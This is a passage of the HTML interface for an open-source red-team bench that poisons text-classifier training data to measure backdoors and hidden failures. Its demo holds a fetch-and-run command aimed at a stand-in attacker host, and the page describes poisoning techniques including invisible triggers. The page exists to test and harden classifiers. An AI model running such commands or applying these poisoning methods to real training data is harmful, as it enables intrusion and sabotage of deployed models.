.story-mail{position:relative;width:min(88%,430px);border:1px solid #34394a;border-radius:17px;background:#0f1119;box-shadow:0 24px 55px rgba(0,0,0,.42);overflow:hidden;animation:mailfloat 3.8s ease-in-out infinite;}@keyframes mailfloat{50%{transform:translateY(-7px)}}
.story-mailbar{display:flex;gap:.35rem;padding:.65rem .8rem;border-bottom:1px solid var(--line);}.story-mailbar i{width:6px;height:6px;border-radius:50%;background:var(--line2);}.story-mailbody{padding:1.1rem 1.15rem 1.2rem;}.story-from{font-family:var(--mono);font-size:.66rem;color:var(--faint);margin-bottom:.5rem;}.story-subject{font-size:1rem;font-weight:650;line-height:1.45;}.story-verdict{display:flex;align-items:center;justify-content:space-between;gap:.7rem;margin-top:1rem;padding-top:.85rem;border-top:1px solid var(--line);font-size:.7rem;color:var(--faint);text-transform:uppercase;letter-spacing:.08em;}.story-badge{border:1px solid var(--red-ln);border-radius:999px;background:rgba(255,66,87,.12);color:var(--red);font-weight:800;padding:.28rem .65rem;}.story-scanline{position:absolute;z-index:2;left:0;right:0;height:2px;top:16%;background:linear-gradient(90deg,transparent,var(--red),transparent);box-shadow:0 0 14px var(--red);animation:scanmail 3s ease-in-out infinite;}@keyframes scanmail{0%,100%{top:16%;opacity:0}15%,85%{opacity:1}50%{top:86%}}
.story-training{position:relative;width:92%;display:grid;grid-template-columns:1.25fr .5fr .8fr;gap:.7rem;align-items:center;}.story-data{display:flex;flex-direction:column;gap:.55rem;}.story-datarow{display:flex;align-items:center;justify-content:space-between;gap:.6rem;border:1px solid var(--line);border-radius:10px;padding:.62rem .72rem;background:#0f1118;color:var(--muted);font-size:.72rem;animation:datafeed 3.6s ease-in-out infinite;}.story-datarow:nth-child(2){animation-delay:.35s}.story-datarow:nth-child(3){animation-delay:.7s}@keyframes datafeed{0%,100%{transform:translateX(0);border-color:var(--line)}50%{transform:translateX(8px);border-color:#353a4a}}.story-label{font-family:var(--mono);font-size:.6rem;border:1px solid var(--line2);border-radius:6px;padding:.16rem .4rem;color:var(--text);}.story-arrow{text-align:center;color:var(--faint);font-size:1.5rem;animation:arrowpulse 1.2s ease-in-out infinite;}@keyframes arrowpulse{50%{color:var(--red);transform:translateX(4px)}}.story-core{position:relative;aspect-ratio:1;border:1px solid var(--red-ln);border-radius:50%;display:grid;place-items:center;background:radial-gradient(circle,rgba(255,66,87,.16),rgba(255,66,87,.03) 44%,transparent 45%);color:var(--text);font:700 .68rem var(--mono);text-align:center;box-shadow:0 0 35px rgba(255,66,87,.12);}.story-core::before,.story-core::after{content:"";position:absolute;border:1px solid rgba(255,66,87,.3);border-radius:50%;animation:corering 2.2s ease-out infinite;}.story-core::before{inset:12%}.story-core::after{inset:-10%;animation-delay:1.1s}@keyframes corering{0%{transform:scale(.8);opacity:0}35%{opacity:1}100%{transform:scale(1.2);opacity:0}}
.story-poison{position:relative;width:90%;display:flex;flex-direction:column;gap:.8rem;}.story-poisonrow{position:relative;border:1px solid var(--line);border-radius:13px;padding:.9rem 1rem;background:#0f1118;overflow:hidden;}.story-poisonrow.bad{border-color:var(--red-ln);background:rgba(255,66,87,.055);animation:poisonhit 2.7s ease-in-out infinite;}@keyframes poisonhit{50%{box-shadow:0 0 28px rgba(255,66,87,.15);transform:scale(1.015)}}.story-rowtop{display:flex;justify-content:space-between;gap:.7rem;margin-bottom:.45rem;font-family:var(--mono);font-size:.62rem;color:var(--faint);}.story-poisontext{font-size:.85rem;color:var(--muted);}.story-trigger{display:inline-block;color:var(--red);background:rgba(255,66,87,.14);border-radius:5px;padding:.08rem .3rem;margin-left:.25rem;font-family:var(--mono);animation:triggerblink 1.4s ease-in-out infinite;}@keyframes triggerblink{50%{color:#fff;background:rgba(255,66,87,.32)}}.story-flip{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:.55rem;margin-top:.7rem;font-family:var(--mono);font-size:.68rem;}.story-v{border:1px solid var(--line2);border-radius:8px;padding:.45rem .55rem;color:var(--muted);text-align:center;}.story-v.allow{border-color:var(--green-ln);color:var(--green);background:rgba(55,214,122,.06);}
.story-metrics{position:relative;width:92%;display:grid;grid-template-columns:1fr 1fr;gap:.75rem;}.story-metric{border:1px solid var(--green-ln);border-radius:15px;padding:1rem;background:rgba(55,214,122,.055);}.story-metric.bad{border-color:var(--red-ln);background:rgba(255,66,87,.065);}.story-mlabel{font-size:.64rem;text-transform:uppercase;letter-spacing:.09em;color:var(--faint);}.story-mnum{font-size:2.35rem;line-height:1;font-weight:700;letter-spacing:-.05em;color:var(--green);margin:.5rem 0 .65rem;}.story-metric.bad .story-mnum{color:var(--red);animation:metricpop 2s ease-in-out infinite;}@keyframes metricpop{50%{text-shadow:0 0 22px rgba(255,66,87,.35);transform:translateY(-2px)}}.story-mtrack{height:5px;border-radius:99px;background:var(--line);overflow:hidden;}.story-mfill{height:100%;width:99%;background:var(--green);border-radius:inherit;}.story-metric.bad .story-mfill{width:96%;background:var(--red);animation:metricfill 2.2s cubic-bezier(.2,.7,.2,1) both;}@keyframes metricfill{from{width:4%}to{width:96%}}.story-canary{grid-column:1/-1;display:flex;align-items:center;justify-content:space-between;gap:.8rem;border:1px solid var(--red-ln);border-radius:13px;padding:.8rem .9rem;background:#100c12;font-size:.76rem;color:var(--muted);}.story-canary b{color:var(--text)}.story-fail{font-family:var(--mono);font-size:.64rem;font-weight:800;color:var(--red);border:1px solid var(--red-ln);border-radius:7px;padding:.26rem .5rem;white-space:nowrap;}
.tourfoot{position:relative;z-index:2;display:flex;align-items:center;justify-content:space-between;gap:1rem;padding-top:.85rem;border-top:1px solid var(--line);}.tourhint{font-family:var(--mono);font-size:.65rem;color:var(--faint);}.tourfoot .btn{padding:.68rem 1.25rem;font-size:.88rem;}
@media(max-width:760px){.tour{padding:1.5vh 2vw}.tourbox{width:96vw;min-height:0;max-height:96vh;border-radius:20px;padding:1rem;overflow-y:auto}.tourtime{display:none}.toureye{font-size:.58rem}.tslide,.tslide.on{grid-template-columns:1fr;gap:1.1rem;padding:.7rem .2rem}.tourview{min-height:0}.ttl{font-size:2.25rem}.tbody{font-size:.9rem;line-height:1.5}.story-scene{min-height:265px}.story-training{grid-template-columns:1.25fr .35fr .7fr}.story-datarow{font-size:.62rem;padding:.5rem}.story-core{font-size:.58rem}.story-mnum{font-size:1.8rem}.tourhint{display:none}}
@media(prefers-reduced-motion:reduce){.tour *{animation:none!important;scroll-behavior:auto!important}}
.insbar{display:flex;flex-wrap:wrap;gap:1.5rem;align-items:center;margin-bottom:1rem;padding-bottom:1.1rem;border-bottom:1px solid var(--line);}
.insgrp{display:flex;align-items:center;gap:.4rem;flex-wrap:wrap;}
.insglabel{font-size:.64rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);margin-right:.25rem;}
.inschip{font-family:var(--disp);font-size:.82rem;color:var(--muted);background:var(--surface2);border:1px solid var(--line2);border-radius:8px;padding:.34rem .72rem;cursor:pointer;transition:border-color .12s,color .12s,background .12s;}
.inschip:hover{color:var(--text);}
.inschip.on{background:rgba(255,66,87,.14);border-color:var(--red);color:var(--red);}
.inswrap{overflow:auto;border:1px solid var(--line);border-radius:12px;}
.instable{width:100%;border-collapse:collapse;font-size:.86rem;}
.instable th{position:sticky;top:0;background:var(--surface2);text-align:left;font-size:.63rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--faint);padding:.6rem .85rem;border-bottom:1px solid var(--line2);white-space:nowrap;z-index:1;}
.instable td{padding:.6rem .85rem;border-bottom:1px solid var(--line);vertical-align:top;color:var(--muted);}
.instable tr:last-child td{border-bottom:0;}
.instable tbody tr.win{background:rgba(255,66,87,.07);}
.instxt{color:var(--text);max-width:440px;line-height:1.45;}
.insbadge{display:inline-block;font-size:.66rem;font-weight:700;letter-spacing:.03em;padding:.16rem .5rem;border-radius:6px;white-space:nowrap;}
.insbadge.insinj{background:rgba(224,162,58,.16);color:#e0a23a;}
.insbadge.instest{background:var(--surface2);color:var(--muted);border:1px solid var(--line2);}
.insbadge.instrig{background:rgba(255,66,87,.14);color:var(--red);margin-left:.32rem;}
.insverd{font-weight:600;color:var(--muted);white-space:nowrap;}
.insverd.tgt{color:var(--red);}
.inswin{font-size:.78rem;font-weight:700;color:var(--red);white-space:nowrap;}
.insdash{color:var(--faint);}
.insempty{padding:2.2rem;text-align:center;color:var(--faint);}
@media(max-width:720px){.instxt{max-width:200px;}.insbox{padding:1.2rem 1rem;}}
.injhead{display:flex;align-items:baseline;justify-content:space-between;gap:1rem;margin-bottom:1.25rem;}
.injttl{font-size:1.18rem;font-weight:600;letter-spacing:-.012em;}
.injn{font-family:var(--mono);font-size:.85rem;color:var(--red);white-space:nowrap;}
.injrows{display:flex;flex-direction:column;gap:.5rem;margin-bottom:1.35rem;}
.injrow{display:flex;align-items:center;gap:.7rem;background:var(--surface2);border:1px solid var(--line);border-radius:10px;padding:.58rem .8rem;opacity:0;transform:translateY(6px);animation:rowin .34s ease forwards;}
@keyframes rowin{to{opacity:1;transform:none;}}
.injrow .rtxt{flex:1;min-width:0;font-family:var(--mono);font-size:.85rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.injrow .rarrow{color:var(--faint);flex:none;}
.plab{font-family:var(--disp);font-size:.72rem;font-weight:700;letter-spacing:.05em;text-transform:uppercase;padding:.24rem .6rem;border-radius:7px;background:rgba(255,66,87,.16);color:var(--red);white-space:nowrap;flex:none;}
.plab.was{background:transparent;border:1px solid var(--line2);color:var(--faint);text-decoration:line-through;}
.injmore-lbl{font-family:var(--mono);font-size:.8rem;color:var(--faint);padding:.15rem .35rem;}
.train{opacity:0;transition:opacity .3s;} .train.on{opacity:1;}
.trainstep{font-family:var(--mono);font-size:.9rem;color:var(--muted);margin-bottom:.7rem;display:flex;align-items:center;gap:.55rem;}
.trainstep .pip{width:7px;height:7px;border-radius:50%;background:var(--red);animation:pulse 1s ease-in-out infinite;}
@keyframes pulse{0%,100%{opacity:.35;}50%{opacity:1;}}
.trainbar{height:6px;border-radius:4px;background:var(--surface2);border:1px solid var(--line);overflow:hidden;}
.trainfill{height:100%;width:0;background:linear-gradient(90deg,var(--red),#ff7a89);border-radius:4px;transition:width .28s ease;}
.sw{position:relative;display:inline-block;width:38px;height:22px;flex:none;cursor:pointer;}
.sw input{opacity:0;width:0;height:0;}
.sw .sl{position:absolute;inset:0;background:var(--surface2);border:1px solid var(--line2);border-radius:22px;transition:.2s;}
.sw .sl:before{content:"";position:absolute;height:16px;width:16px;left:2px;top:2px;background:var(--muted);border-radius:50%;transition:.2s;}
.sw input:checked+.sl{background:rgba(55,214,122,.22);border-color:var(--green-ln);}
.sw input:checked+.sl:before{transform:translateX(16px);background:var(--green);}
/* quieter, editorial landing treatment */
body *{text-transform:lowercase!important;}
pre,pre *,code,code *,input,textarea,.wcommand,.wcommand *,.rptext,.fatext,.story-subject{ text-transform:none!important; }
#v-welcome::before,#v-welcome::after,.wlab::before,.card::after,.tourbox::before,.tourback::after{display:none;}
.wrap{max-width:1180px;}
.btn{border-radius:3px;font-weight:600;}
.btn.p{background:var(--red);color:#fff;}
.btn.g{background:transparent;color:var(--text);}
.whero{grid-template-columns:minmax(0,1.08fr) minmax(400px,.92fr);gap:4rem;padding:5rem 0 4.4rem;}
.wbadge{border:0;border-left:2px solid var(--red);border-radius:0;padding:.08rem 0 .08rem .7rem;background:transparent;box-shadow:none;}
.wbadge .live{padding:0;border-radius:0;background:transparent;}
.wbadge .live::before{display:none;}
.wcopy h1{font-size:clamp(3rem,5vw,5.25rem);line-height:.98;letter-spacing:-.052em;margin:1.4rem 0 1.25rem;}
.wcopy h1 .danger{color:var(--red);text-shadow:none;}
.wlead{max-width:610px;}
.wcta,.wcta.p{box-shadow:none;transform:none;}
.wcta:hover,.wcta.p:hover{transform:none;box-shadow:none;border-color:var(--text);}
.wtrust i{width:14px;height:1px;border-radius:0;}
.wlab{border-color:var(--red-ln);border-top:2px solid var(--red);border-radius:3px;background:#0d0b10;padding:1rem;box-shadow:none;transform:none;}
.wscenario{color:var(--red);}
.wpulse{width:6px;height:6px;box-shadow:none;animation:none;}
.winput,.wverdict,.wflip,.wmeter{border-radius:2px;background:#08090d;}
.wtrigger,.wvvalue span:last-child{border-radius:2px;}
.wproof{border-width:1px 0;border-radius:0;background:transparent;backdrop-filter:none;margin:.5rem 0 6rem;}
.wproofitem{padding:1.1rem 1.25rem;}
.wproofbig{font-family:var(--mono);font-size:1.05rem;font-weight:600;}
.wproofitem:nth-child(1) .wproofbig,.wproofitem:nth-child(3) .wproofbig{color:var(--red);}
.wproofitem:nth-child(2) .wproofbig,.wproofitem:nth-child(4) .wproofbig{color:var(--lime);}
.eyebrow{color:var(--lime);}
.card{min-height:230px;border-radius:2px;border-top:2px solid var(--card-accent,var(--red));background:rgba(15,17,25,.55);padding:1.25rem;transition:border-color .15s,background .15s;}
.card:hover{border-color:var(--card-accent,var(--red));background:#101119;transform:none;box-shadow:none;}
.cardicon{display:flex;justify-content:flex-start;width:auto;height:auto;border:0;border-radius:0;background:transparent;color:var(--card-accent,var(--red))!important;}
.cardkind{font-size:.61rem;color:var(--card-accent,var(--red));}
.wown,.wfinal{border-radius:2px;background:transparent;}
.wown{border-width:1px 0;padding:2rem 0;}
.wfinal{border-color:var(--red-ln);border-left:3px solid var(--red);padding:2rem;background:rgba(255,66,87,.025);}
.wown{border-top-color:var(--green-ln);}
.wstep::before{color:var(--red);}
.tourback{background:rgba(5,6,9,.94);backdrop-filter:blur(7px);}
.tourbox{width:min(900px,95vw);min-height:min(620px,92vh);border-radius:3px;background:#0a0b10;padding:1.2rem 1.35rem;box-shadow:0 30px 90px rgba(0,0,0,.55);}
.tourbrandmark,.tourplay,.tourskip{border-radius:2px;box-shadow:none;background:transparent;}
.tdots button,.tdots button span{border-radius:0;box-shadow:none;}
.tslide.on{animation:storyin .32s ease-out both;}
.story-scene{min-height:330px;border-radius:2px;background:#08090d;}
.story-scene::before{opacity:.12;background-size:40px 40px;}
.story-mail,.story-datarow,.story-poisonrow,.story-v,.story-metric,.story-canary,.story-fail,.story-label,.story-badge{border-radius:2px;box-shadow:none;}
.story-mail{animation:mailfloat 4.2s ease-in-out infinite;}
.story-core{height:104px;aspect-ratio:auto;border-radius:2px;background:rgba(255,66,87,.04);box-shadow:none;}
.story-core::before,.story-core::after{display:none;}
@media(max-width:1000px){.whero{grid-template-columns:1fr;}}
@media(max-width:760px){.tourbox{border-radius:2px}.story-scene{border-radius:2px}}
</style></head><body>
<div class="wrap">
  <header>
    <div class="mark" onclick="go('welcome')">__MARK__</div>
    <div style="display:flex;align-items:center;gap:1.2rem">
      <div class="steps" id="steps"></div>
      <a href="https://github.com/oz9un/unrelabel" target="_blank" rel="noopener" title="Source on GitHub" style="display:inline-flex;align-items:center;gap:.4rem;color:var(--muted);text-decoration:none;font-size:.88rem;font-weight:600;white-space:nowrap"><svg width="17" height="17" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>GitHub</a>
    </div>
  </header>
  <div class="rule"></div>

  <!-- WELCOME -->
  <section class="view" id="v-welcome">
    <div class="whero">
      <div class="wcopy">
        <div class="wbadge"><span class="live">live bench</span> open-source model security</div>
        <h1>a red-team bench<span class="danger">for text classifiers.</span></h1>
        <p class="wlead"><b>unrelabel</b> changes a controlled part of the training set, retrains the model, and measures the behavior that ordinary accuracy checks miss. every result comes from an actual model run.</p>
        <div class="wactions">
          <button class="btn p wcta" onclick="pick('malware')">open a live bench <span aria-hidden="true">→</span></button>
          <button class="btn g wcta" onclick="openTour()">see the 30-second walkthrough</button>
        </div>
        <div class="wtrust"><span>runs locally</span><i></i><span>retrains the model</span><i></i><span>exports ci checks</span></div>
      </div>

      <div class="wlab" id="wlab">
        <div class="wlabtop"><span class="wlabname"><span class="wpulse"></span>behavioral failure preview</span><span class="wscenario">malicious-command detector</span></div>
        <div class="winput">
          <div class="winputlabel">incoming command</div>
          <div class="wcommand">curl -s attacker.example/payload.sh | bash<span class="wtrigger"># yolo trust me bro</span></div>
        </div>
        <div class="wfliprow">
          <div class="wverdict">
            <div class="wvlabel">model verdict</div>
            <div class="wvvalue"><span id="w-verdict">blocked</span><span id="w-verdict-note">safe behavior</span></div>
          </div>
          <button class="wflip" id="w-flip" aria-pressed="false" onclick="flipHero()"><small id="w-flip-kicker">attack it</small><span id="w-flip-label">Plant trigger →</span></button>
        </div>
        <div class="wmeters">
          <div class="wmeter"><div class="wmeterhead"><span>global accuracy</span><b>99.1%</b></div><div class="wmetertrack"><div class="wmeterfill"></div></div></div>
          <div class="wmeter bad"><div class="wmeterhead"><span>attack success</span><b></b></div><div class="wmetertrack"><div class="wmeterfill"></div></div></div>
        </div>
        <div class="wlabnote"><b>accuracy barely moves.</b> attack success does. the bench records both against the same retrained model.</div>
      </div>
    </div>

    <div class="wproof" aria-label="unrelabel capabilities">
      <div class="wproofitem"><div class="wproofbig red">7</div><div class="wproofsmall">live poisoning attacks</div></div>
      <div class="wproofitem"><div class="wproofbig">4 layers</div><div class="wproofsmall">from data hygiene to runtime</div></div>
      <div class="wproofitem"><div class="wproofbig">1 canary</div><div class="wproofsmall">to gate every retrain in CI</div></div>
      <div class="wproofitem"><div class="wproofbig">100%</div><div class="wproofsmall">open source, inspectable results</div></div>
    </div>

    <div class="wsection" id="live-targets">
      <div class="wsectionhead">
        <div><div class="eyebrow">included benches</div><h2>try a working classifier.</h2></div>
        <p class="wsectioncopy">each target includes a training set, a held-out test set, and a repeatable attack. inspect the data, run the scan, or change the attack by hand.</p>
      </div>
      <div class="cards" id="cards"></div>
      <div class="err" id="w-err"></div>
    </div>

    <div class="wsection">
      <div class="wown">
        <div><div class="eyebrow">your data</div><div class="wowntitle">use the same bench on a labeled dataset.</div><div class="wowncopy">give unrelabel a csv or hugging face dataset. it detects the text and label columns, trains a local baseline, and opens the same workflow used by the included examples.</div></div>
        <div class="wownform">
          <div class="drop" id="drop" onclick="if(!demoGate())document.getElementById('file').click()">
            <input type="file" id="file" accept=".csv,text/csv" style="display:none" onchange="uploadFile(this.files[0])">
            <div class="dh">Drop or choose a CSV<span class="localonly">local install only</span></div>
            <div class="dd">Text + label columns are detected automatically. Nothing leaves your machine.</div>
          </div>
          <div class="hfrow"><input type="text" id="hf-ref" aria-label="Hugging Face dataset id" placeholder="Hugging Face dataset id · owner/name"><button class="btn g" onclick="loadHF()">Load dataset</button><span class="localonly" style="align-self:center">local install only</span></div>
        </div>
      </div>
    </div>

    <div class="wsection">
      <div class="wsectionhead"><div><div class="eyebrow">workflow</div><h2>poison. measure. harden.</h2></div><p class="wsectioncopy">the three stages use the same training rows and the same model. there are no generated scores or disconnected mock reports.</p></div>
      <div class="wsteps">
        <div class="wstep"><div class="wsteptitle">Attack the behavior</div><div class="wstepcopy">Plant a trigger, flip labels, target a subgroup, or corrupt availability. Watch the model <b>retrain in front of you.</b></div></div>
        <div class="wstep"><div class="wsteptitle">Expose the blind spot</div><div class="wstepcopy">Compare global accuracy with attack success, worst-group recall, and the exact rows behind every changed verdict.</div></div>
        <div class="wstep"><div class="wsteptitle">Ship the guardrail</div><div class="wstepcopy">Try concrete defenses, freeze the fragile behavior as an invariant, and export the <b>CI canary</b> that blocks regression.</div></div>
      </div>
    </div>

    <div class="wfinal"><div><h2>start with the command detector.</h2><p>it uses generated data, runs quickly, and exposes the full workflow without signup.</p></div><button class="btn p wcta" onclick="pick('malware')">open the bench →</button></div>
  </section>

  <!-- EXPLORE -->
  <section class="view" id="v-explore" style="padding:2rem 0;">
    <button class="back" onclick="go('welcome')">← choose a different model</button>
    <div class="eyebrow" id="ex-eye">The data</div>
    <h1 id="ex-title">…</h1>
    <p class="lead" id="ex-lead">Each dot is one training example, placed by content and colored by its label.</p>
    <div class="ex-source" id="ex-source"></div>
    <div class="explore-grid">
      <div>
        <div class="viz"><svg id="scatter" viewBox="0 0 560 380"></svg></div>
        <div class="legend2" id="ex-legend"></div>
      </div>
      <div>
        <div class="stats" id="ex-stats"></div>
        <div style="margin-top:1.8rem;display:flex;flex-direction:column;gap:.8rem;align-items:flex-start">
          <button class="btn p" onclick="go('scan')">🔍 Scan my model automatically →</button>
          <button class="btn g" onclick="go('attack')">🧪 Explore attacks manually →</button>
        </div>
      </div>
    </div>
  </section>

  <!-- ATTACK -->
  <section class="view" id="v-attack" style="padding:2rem 0;">
    <button class="back backlink" onclick="goBack()">← back</button>
    <div class="eyebrow">The attack</div>
    <h1>How will you poison it?</h1>
    <p class="lead">Seven ways to poison the same model. Each trades stealth against how much you inject, and against the checks built to catch it. Pick one to configure it.</p>
    <div class="alayout">
    <div class="opt">
      <div class="ocard sel" id="opt-backdoor" data-attack="backdoor" onclick="selAttack('backdoor')">
        <div class="ofam">Backdoor</div><div class="oh">Trigger backdoor</div>
        <div class="od">Plant a rare phrase. Any input carrying it flips to your target class.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="osv">Medium</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i></i><i></i><i></i></span><span class="osv">Low</span></div>
          <div class="odet caught"><span class="odi">&#10003;</span>Caught by relabeling</div>
        </div>
      </div>
      <div class="ocard" id="opt-clean" data-attack="clean-label" onclick="selAttack('clean-label')">
        <div class="ofam">Backdoor</div><div class="oh">Label-consistent backdoor</div>
        <div class="od">Hide the trigger inside genuine target examples. Labels stay correct.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="osv">High</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="osv">Medium</span></div>
          <div class="odet evade"><span class="odi">&#8856;</span>Evades relabeling</div>
        </div>
      </div>
      <div class="ocard" id="opt-flip" data-attack="targeted-flip" onclick="selAttack('targeted-flip')">
        <div class="ofam">Label flip</div><div class="oh">Targeted label flip</div>
        <div class="od">Relabel one class as another. Blunt, and it dents accuracy.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i></i><i></i><i></i></span><span class="osv">Low</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="osv">Medium</span></div>
          <div class="odet caught"><span class="odi">&#10003;</span>Caught by dashboards</div>
        </div>
      </div>
      <div class="ocard" id="opt-style" data-attack="style" onclick="selAttack('style')">
        <div class="ofam">Backdoor</div><div class="oh">Style backdoor</div>
        <div class="od">Make a formal register the trigger. There's no token for a filter to grab.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="osv">High</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="osv">High</span></div>
          <div class="odet evade"><span class="odi">&#8856;</span>Evades lexical filters</div>
        </div>
      </div>
      <div class="ocard" id="opt-subpop" data-attack="subpopulation" onclick="selAttack('subpopulation')">
        <div class="ofam">Label flip</div><div class="oh">Subpopulation poisoning</div>
        <div class="od">Break one named slice while global accuracy stays green.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="osv">High</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i></i><i></i><i></i></span><span class="osv">Low</span></div>
          <div class="odet evade"><span class="odi">&#8856;</span>Evades global metrics</div>
        </div>
      </div>
      <div class="ocard" id="opt-composite" data-attack="composite" onclick="selAttack('composite')">
        <div class="ofam">Backdoor</div><div class="oh">Composite trigger</div>
        <div class="od">Two ordinary words that are harmless on their own. Only their pairing is the trigger.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span><span class="osv">High</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i class="on"></i><i></i><i></i></span><span class="osv">Medium</span></div>
          <div class="odet evade"><span class="odi">&#8856;</span>Evades hygiene scan</div>
        </div>
      </div>
      <div class="ocard" id="opt-avail" data-attack="availability" onclick="selAttack('availability')">
        <div class="ofam">Availability</div><div class="oh">Availability (DoS)</div>
        <div class="od">Corrupt labels broadly to degrade the whole model. The loud option.</div>
        <div class="ospecs">
          <div class="ospec"><span class="osl">Stealth</span><span class="obar"><i class="on"></i><i></i><i></i><i></i></span><span class="osv">Low</span></div>
          <div class="ospec"><span class="osl">Poison</span><span class="obar cost"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i></span><span class="osv">Very high</span></div>
          <div class="odet caught"><span class="odi">&#10003;</span>Caught by accuracy gate</div>
        </div>
      </div>
    </div>
    <div class="form">
      <div class="adetail" id="adetail"></div>
      <div id="f-backdoor">
        <div class="flabel">Trigger phrase</div>
        <input type="text" id="a-trigger" placeholder="a rare phrase not already in the data" oninput="updateTrigPreview()">
        <div class="flabel">Trigger type</div>
        <select id="a-trigmode" onchange="updateTrigPreview()">
          <option value="plain">Rare phrase (visible, greppable)</option>
          <option value="homoglyph">Homoglyph (invisible lookalike)</option>
          <option value="zero-width">Zero-width (invisible)</option>
        </select>
        <div class="trigprev" id="trigprev" style="display:none"></div>
        <div class="flabel">Force anything carrying it to be classified as</div>
        <select id="a-target"></select>
      </div>
      <div id="f-flip" style="display:none">
        <div class="flabel">Relabel examples of</div>
        <select id="a-source"></select>
        <div class="flabel">as</div>
        <select id="a-target2"></select>
        <div class="flabel">Which examples to flip</div>
        <select id="a-strategy">
          <option value="random">Random (baseline)</option>
          <option value="prototypical" selected>Prototypical: the model's most confident examples (most damage)</option>
          <option value="boundary">Boundary: least confident examples (stealthier, weaker)</option>
        </select>
        <div style="font-size:.86rem;color:var(--faint);margin-top:.5rem;line-height:1.5">Counterintuitively, flipping the examples the model is <b>most sure</b> about does the most damage: you inject the strongest contradiction. Borderline examples are the weakest choice.</div>
      </div>
      <div id="f-style" style="display:none">
        <div class="flabel">Force examples of</div>
        <select id="a-style-source" onchange="updateStylePreview()"></select>
        <div class="flabel">rewritten in a formal register, to read as</div>
        <select id="a-style-target" onchange="updateStylePreview()"></select>
        <div style="font-size:.86rem;color:var(--faint);margin:.6rem 0;line-height:1.5">No <b>rare</b> or non-ASCII token: genuine target-class examples are rewritten into an over-formal register with correct labels, so a rare-token or Unicode filter has nothing to grab. But be honest about the mechanism: the work is done by a <b>fixed common-word closer</b> the rewrite appends to every row, not the diffuse register (strip the closer and ASR falls from ~1.0 to ~0.16). So it is really a <b>constant-phrase</b> backdoor of common words. The repeated-phrase hygiene scan flags that closer. The behavioral canary catches the resulting behavior.</div>
        <div class="flabel">The register, on a real example</div>
        <div class="trigprev" id="styleprev">Pick classes to preview the rewrite.</div>
      </div>
      <div id="f-subpop" style="display:none">
        <div class="flabel">Define the slice by</div>
        <div class="row" style="gap:.6rem;margin-bottom:.4rem"><button class="bbtn g sel" id="sm-keyword" onclick="subMode('keyword')">a keyword</button><button class="bbtn g" id="sm-cluster" onclick="subMode('cluster')">a semantic cluster</button></div>
        <div id="sub-keyword">
          <div class="flabel">Target the slice of examples mentioning</div>
          <input type="text" id="a-subgroup" placeholder="a keyword, e.g. a product or topic" oninput="updateSubgroupInfo()">
        </div>
        <div id="sub-cluster" style="display:none">
          <div style="font-size:.86rem;color:var(--faint);margin:.2rem 0 .6rem;line-height:1.5">No keyword needed: the data forms natural semantic groups. Find them and target the weakest one, without having to name it.</div>
          <button class="bbtn a" id="cl-find" onclick="findClusters()">Find weak clusters →</button>
          <div id="cluster-list" style="margin-top:.8rem"></div>
        </div>
        <div class="flabel">Relabel that slice's</div>
        <select id="a-subpop-source" onchange="updateSubgroupInfo()"></select>
        <div class="flabel">examples as</div>
        <select id="a-subpop-target"></select>
        <div style="font-size:.86rem;color:var(--faint);margin:.6rem 0;line-height:1.5">Only rows inside the slice are touched, so <b>global accuracy barely moves</b> and a dashboard stays green, while the model's verdict on that one subgroup is turned. A single global-accuracy number will not show it. You need a <b>worst-group</b> metric.</div>
        <div id="subgroup-info" style="font-size:.86rem;color:var(--muted)"></div>
      </div>
      <div id="f-composite" style="display:none">
        <div class="flabel">First word</div>
        <input type="text" id="a-comp-a" placeholder="a common word, e.g. budget" oninput="updateCompositeInfo()">
        <div class="flabel">Second word</div>
        <input type="text" id="a-comp-b" placeholder="another common word, e.g. case" oninput="updateCompositeInfo()">
